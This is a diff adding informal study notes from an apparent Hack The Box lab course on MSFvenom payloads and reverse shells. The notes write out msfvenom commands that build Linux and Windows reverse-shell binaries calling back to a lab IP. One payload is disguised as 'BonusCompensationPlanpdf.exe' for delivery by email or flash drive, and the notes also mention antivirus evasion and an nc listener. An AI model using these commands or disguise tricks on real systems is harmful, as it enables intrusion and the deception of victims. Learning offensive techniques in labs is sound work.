@@ -300,4 +300,55 @@ meterpreter>shell
 10.129.201.160 
 <test> Exploit the target using what you've learned in this section, then submit the name of the file
  located in htb-student's Documents folder. (Format: filename.extension)
-
+$nmap -sV -sC -Pn --top-ports 100 <ip>
+<r> smb2 OS 10 pro 18363 >> set RHOSTS ,...
+$ls C:/Users/htb-student/Documents/
+\\\\\\\\\\\\\\\\\=========================
+Crafting Payloads with MSFvenom
+-using automated atks in matasploit requires us to reach a vulnerable target machine over the network. 
+run the exploit module, deliver the payload, and establish the shell session, we need comm with the system in the 1st (internal atk)
+-in almost case we dont have reach internal network -> crafty in how the payload get delivered and executed on the sys. one such way may be to use MSFvenom to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file
+-in addtion to providing a payload with flexible delivery options, MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus detection signatures.
+\\Practicing with MSFvenom
+$msfvenom -l payload to list all the available payload
+\\Staged vs. Stageless Payloads
+-staged create a way for us to send over more components of our atk. it like "setting the stage"  EX linux/x86/shell/reverse_tcp when run using an exploit module in msf. ths payload will send a small stage that will be exec on the target and then call back to the atk box to download the remainder of the payload over the network.
+-> then execute the shellcode to establish a reverse shell. (stage take some memory which leave less space for the payload) what happen at each stage could vary depending on the payload
+-stageless payload do not have a stage, take for ex linux/zarch/meterpreter_reverse_tcp
+->run it in exploit MSF this will sent in its entirely across a network conn without a stage.this could benefit us in environments where we do not have access to much bandwidt and latency can interfere. staged payload could lead to unstable shell sessions.
+->best to select a stageless payload. sometimes it be better for evasion purpose dueto less traffic passing over the network to exec the payload, especially if we deliver it by employing social engineering. 
+-This conceptis also very well explained by Rapid 7 in this blog spothttps://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/
+-there naming convension betw staged and stageless payload
+\\Building A Stageless Payload
+$msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+\\call MSFvenom
+$msfvenom  >defines the tool used to make the payload
+\\Creating a Payload
+-p  > this option indicates that msfvenom is creating a payload
+\\Choosing the Payload based on Architecture
+$linux/x64/shell_reverse_tcp   > specifies a linux 64-bit stageless payload that will initiate a TCP-based reverse shell (shell_reverse_tcp)
+\\Address to Connect Back to
+LHOST=10.10.14.113 LPORT=443
+when exec the payload will call back to the specified IP addr 10.10.14.113 on the specified port (443)
+\\Format To Generate Payload In
+-f elf    > the flag -f specifies the format the generated binary will be in. 
+\\Output  >  createbackup.elf
+\\Executing a Stageless Payload
+- email message with the file attached
+-Download link on a web
+-combined with a metasploit exploit module (require internal network)
+-via flash drive as part of an onsite pentest
+-> we would have a listener ready to catch the conn on the atk box side upon successful exec
+\\NC Connection
+$sudo nc -lvnp 443       > when the file is exec we will caught a Shell\
+\\Connection established
+\\Building a simple Stageless Payload for a Windows system
+$msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+same command Syntax
+\\Executing a Simple Stageless Payload on a Windows System
+without masking the file sooon wwill be detected by AV 
+\\\\\\\\\\\\====================================================
+Infiltrating Windows
+atk surface grows daily:https://www.cvedetails.com/vendor/26/Microsoft.html
+\\Prominent Windows exploits
+MS08-067 , Eternal Blue, PrintNightmare, BlueKeep, Sigred, SeriousSam, Zerologon
